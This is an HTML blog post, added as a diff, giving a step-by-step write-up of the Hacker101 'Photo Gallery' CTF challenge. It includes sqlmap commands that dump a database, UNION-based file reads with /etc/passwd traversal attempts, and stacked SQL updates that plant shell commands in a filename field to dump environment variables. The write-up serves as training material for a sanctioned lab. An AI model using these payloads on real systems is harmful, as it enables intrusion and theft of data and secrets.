@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <title>Andy's Terminal - CTF Hacker 101 Photo Gallery - write-up</title>
+        <meta property="og:title" content="Andy's Terminal - CTF Hacker 101 Photo Gallery - write-up" />
+        <meta property="og:type" content="website" />
+        <meta property="og:url" content="https://andy.codes/content/blog/2022-07-30-ctf-hacker101-photo-gallery.html" />
+        <meta property="og:image:width" content="988" />
+        <meta property="og:image:height" content="605" />
+
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta http-equiv="Cache-control" content="no-cache, no-store, must-revalidate">
+        <meta http-equiv="Pragma" content="no-cache">
+
+        <link rel="icon" type="image/x-icon" href="/assets/img/favicon.ico" />
+        <link href="/assets/css/styles.css" rel="stylesheet">
+        <link href="/assets/css/lightbox.min.css" rel="stylesheet">
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi" crossorigin="anonymous">
+
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
+        <script src="https://kit.fontawesome.com/506cba49ac.js" crossorigin="anonymous"></script>
+        <script src="/assets/js/lightbox-plus-jquery.min.js"></script>
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+        <script
+            async
+            src="https://www.googletagmanager.com/gtag/js?id=G-Q6PN1HTQ5K"
+        ></script>
+        <script>
+            window.dataLayer = window.dataLayer || [];
+            function gtag() {
+                dataLayer.push(arguments);
+            }
+            gtag("js", new Date());
+
+            gtag("config", "G-Q6PN1HTQ5K");
+        </script>
+    </head>
+    <body class="terminal-main">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col-sm-2 offset-sm-8 col-xs-4 offset-xs-7 terminal-menu">
+                    <a href="/">&#47;home</a> <a href="/content/projects">&#47;projects</a> <a href="/content/blog">&#47;blog</a> 
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-sm-8 offset-sm-2 col-xs-4 offset-xs-7">
+                    <h1 class="text-center">CTF Hacker 101 Photo Gallery - write-up</h1>
+                    <div class="text-center">(<a href="/content/blog">back</a>)</div>
+                    <br />
+                    <div class="section-content">
+                        For a couple of months, I've wanted to do a little write-up about some of the HTB boxes or other targets I've gone through, but I never found enough reason to do it. Recently, however, I've been going through the Hacker101 CTF and encountered the "Photo Gallery" challenge.<br />
+                        I usually approach any challenge by giving it a try myself but if I get stuck for hours, I go and google write-ups of other hackers, and even if I don't get stuck, once I complete it I check write-ups anyway. It is the approach most experienced infosec professionals recommend, mainly for learning purposes, since there's always more than one way of getting a flag.<br/> 
+                        This challenge wasn't super complicated; it took me some time to figure things out, but I could complete it without any significant issues. So, after I finished it, I went and started looking at the write-ups that are out there, and this is what triggered me to write this blog post.<br /> 
+                        While going through what others were doing approaching the target, I noticed that many solutions make no sense; they lack the details, the authors draw misleading conclusions, or in some cases, the solutions are plain wrong. For instance, this challenge contains one of the flags stored in the database, and someone said that the sqlmap offered to brute-force it, and they even pasted the result of that brute-force. I will leave it without further comments ;)<br />
+                        <br />
+                        Anyway, since there are already several write-ups out there spoiling the fun, I thought I could write it myself. I hope that explaining everything step by step and providing all the details will allow you to learn and understand something (of course, you can copy and paste my commands, which will work too).<br />
+                        <br />
+                        So, here we go.<br />
+                        <br />
+                        Here is the screenshot of the target app, which looks like a simple photo gallery.<br />
+                        <br />
+                        <a href="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/1.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/1.png"></a>
+                        <br />
+                        It also looks like one of the images is not displayed correctly. So let's view the source.<br />
+                        <br />
+                        <a href="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/2.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/2.png"></a>
+                        <br />
+                        The page doesn't contain the direct URLs to the images but instead uses some API to retrieve the image paths. Cool, there's something to break here.<br /> 
+                        Every time I see this type of API, where we have a <code>parameter=value</code> in the URL, I cross my fingers that there's a database in the backend and launch the sqlmap.<br />
+                        <br />
+                        <h2>Database enumeration</h2>
+                        <br />
+                        <pre>
+
+                        sqlmap -u "https://8ba5a20cce1a3e195a5afdadbc87337f.ctf.hacker101.com/fetch?id=1"
+                        </pre>
+                        <br />
+                        <a href="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/3.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/3.png"></a>
+                        <br />
+                        Sure enough, the <code>id</code> parameter is vulnerable to SQL, and it is time-based blind SQLi in this case.<br />
+                        Let's check the current database name.<br />
+                        <br />
+                        <pre>
+
+                        sqlmap -u "https://8ba5a20cce1a3e195a5afdadbc87337f.ctf.hacker101.com/fetch?id=1" --current-db --threads=10
+                        </pre>
+                        <br />
+                        <a href="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/4.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/4.png"></a>
+                        <br />
+                        Now, let's retrieve the tables and their content.<br />
+                        <br />
+                        <strong>Tabels</strong><br />
+                        <pre>
+
+                        sqlmap -u "https://8ba5a20cce1a3e195a5afdadbc87337f.ctf.hacker101.com/fetch?id=1" --tables -D level5 --threads=10
+                        </pre>
+                        <br />
+                        <a href="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/5.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/5.png"></a>
+                        <br />
+                        <strong>Content</strong><br />
+                        <pre>
+
+                        sqlmap -u "https://8ba5a20cce1a3e195a5afdadbc87337f.ctf.hacker101.com/fetch?id=1" --dump -D level5 -T albums --threads=10
+                        sqlmap -u "https://8ba5a20cce1a3e195a5afdadbc87337f.ctf.hacker101.com/fetch?id=1" --dump -D level5 -T photos --threads=10
+                        </pre>
+                        <br />
+                        <a href="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/6.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/6.png"></a>
+                        <br />
+                        Here's our first flag.<br />
+                        <br />
+                        Based on the parameter <code>id</code>, it looks like the application retrieves the filename and loads the file. We could check if this is vulnerable to a union attack, using a non-existing file id and a filename that we know is valid.<br />
+                        <pre>
+
+                        https://8ba5a20cce1a3e195a5afdadbc87337f.ctf.hacker101.com/fetch?id=4%20union%20select%20%27./files/adorable.jpg%27--
+                        </pre>
+                        So, it looks like we can load files using this URL:<br />
+                        <br />
+                        <a href="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/7.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/7.png"></a>
+                        <br />
+                        Trying to read a few different files (e.g., index.html or index.php), it's unclear what development stack this is or where we are in the directory structure. It also seems like we can't escape the current folder. The following URLs:<br />
+                        <br />
+                        <pre>
+
+                        https://8ba5a20cce1a3e195a5afdadbc87337f.ctf.hacker101.com/fetch?id=4 union select '/etc/passwd'--
+                        https://8ba5a20cce1a3e195a5afdadbc87337f.ctf.hacker101.com/fetch?id=4 union select '../../../../../../../../../../../../../../../../etc/passwd'--
+                        https://8ba5a20cce1a3e195a5afdadbc87337f.ctf.hacker101.com/fetch?id=4 union select '..././..././..././..././..././..././..././..././..././..././..././..././etc/passwd'--
+                        </pre>
+                        result with 500 server response.<br />
+                        <br />
+                        Time to look at the hints.<br />
+                        One of the Flag0 hints says: This application runs on the uwsgi-nginx-flask-docker image.<br />
+                        So it's python + flask.<br />
+                        A quick google search, and we find: <a href="https://hub.docker.com/r/tiangolo/uwsgi-nginx-flask/">https://hub.docker.com/r/tiangolo/uwsgi-nginx-flask/</a><br />
+                        <br />
+                        In the documentation, we see the folder structure of the app and file names of the code and config. According to the docs, from the app folder, we should read the uwsgi.ini file:<br />
+                        <br />
+                        <a href="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/8.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/8.png"></a>
+                        <br />
+                        Based on the file content (and according to the documentation), the main code is in main.py, so let's load it.<br />
+                        <br />
+                        <a href="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/9.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/9.png"></a>
+                        <br />
+                        Here's our second flag.<br /> 
+                        Let's see if we can get it formatted by checking the page source.<br />
+                        <br />
+                        <a href="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/10.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/10.png"></a>
+                        <br />
+                        That's much better. I immediately see the command injection vulnerability here, but let's go through the code line by line. First, let's extract the essential part:<br />
+                        <pre>
+
+                        cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
+                        fns = []
+                        for pid, ptitle, pfn in cur.fetchall():
+                            rep += '&ltdiv&gt&ltimg src="fetch?id=%i" width="266" height="150">&ltbr&gt%s&lt/div&gt' % (pid, sanitize(ptitle))
+                            fns.append(pfn)
+                        rep += '&lti&gtSpace used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '&lt/i&gt'
+                        rep += '&lt/div&gt\n'
+                        </pre>
+                        The line below executes an SQL query to get our files from the database:<br />
+                        <pre>
+
+                        cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
+                        </pre>
+                        Then, we loop through the results:<br />
+                        <pre>
+
+                        for pid, ptitle, pfn in cur.fetchall():
+                        </pre>
+                        Next, we make a list of the actual file names:<br />
+                        <pre>
+
+                        fns.append(pfn)
+                        </pre>
+                        Finally, here's where the magic happens:<br />
+                        <pre>
+
+                        rep += '&lti&gtSpace used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '&lt/i&gt'
+                        </pre>
+                        This piece of code in particular:<br />
+                        <pre>
+
+                        'du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns)
+                        </pre>
+                        That's our command injection vulnerability. We see that the code will insert every value of the filename column in the place of %s, and there doesn't seem to be any sanitization. So, if we could insert a Linux command instead of a file path, it would be executed. We, of course, have to format it properly, so it makes sense and can get executed, but that's easy. For instance, our fn could have a value of:<br />
+                        <pre>
+
+                        . || ls &gt 'file.txt'
+                        </pre>
+                        If we add it in place of <code>%s</code>, the application will execute this:
+                        <pre>
+
+                        du -ch . || ls &gt 'file.txt' || exit 0
+                        </pre>
+                        Looking at the content of the main.py file, the SQL-related part doesn't do any magic, so we could try to stack SQL commands. Let's give it a try.<br />
+                        <br />
+                        Of course, we have to encode it, so the whole URL looks like this:<br />
+                        <pre>
+
+                        https://8ba5a20cce1a3e195a5afdadbc87337f.ctf.hacker101.com/fetch?id=1;%20update%20photos%20set%20filename=%27.%20||%20ls%20.%20%3Efile.txt%20%27%20where%20id=3;%20commit;%20--
+                        </pre>
+                        Now we refresh the main page so that the code executes and then loads the file using the previous union:<br />
+                        <pre>
+
+                        https://8ba5a20cce1a3e195a5afdadbc87337f.ctf.hacker101.com/fetch?id=4%20union%20select%20%27file.txt%27--
+                        </pre>
+                        <br />
+                        <a href="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/11.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/11.png"></a>
+                        <br />
+                        We can also double-check that the filename column of the photos table contains our command:<br />
+                        <pre>
+
+                        sqlmap -u "https://8ba5a20cce1a3e195a5afdadbc87337f.ctf.hacker101.com/fetch?id=1" --dump -D level5 -T photos -C filename --threads=10
+                        </pre>
+                        <br />
+                        <a href="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/12.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/12.png"></a>
+                        <br />
+                        I followed this approach for a little longer and checked the content of different files, but after some time, I started feeling a bit stuck, so I decided to look at the hints. The last available hint said, "Be aware of your environment." So let's try to output the environment variables into the file and then load it:<br />
+                        <pre>
+
+                        https://8ba5a20cce1a3e195a5afdadbc87337f.ctf.hacker101.com/fetch?id=1;%20update%20photos%20set%20filename=%27.%20||%20env%20%3Efile.txt%20%27%20where%20id=3;%20commit;%20--
+                        </pre>
+                        <br />
+                        <a href="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/13.png" data-lightbox="img" data-title=""><img class="ui bordered small image" src="/assets/img/2022-07-30-ctf-hacker101-photo-gallery/13.png"></a>
+                        <br />
+                        That's it; here are all the flags we already had, plus the last one.<br />
+                        <br />
+                        Writing this post, I tried to be as clear and precise as possible. I hope you enjoyed it and learned something valuable.<br />
+                        <br />
+                    </div>
+                    <br />
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-sm-8 offset-sm-2 col-xs-4 offset-xs-7">
+                    <span class="color-green">0x4ndy:<span class="color-blue">~</span></span><span class="fa-solid fa-terminal color-blue"></span>
+                </div>
+            </div>
+        </div>
+    </body>
+</html>
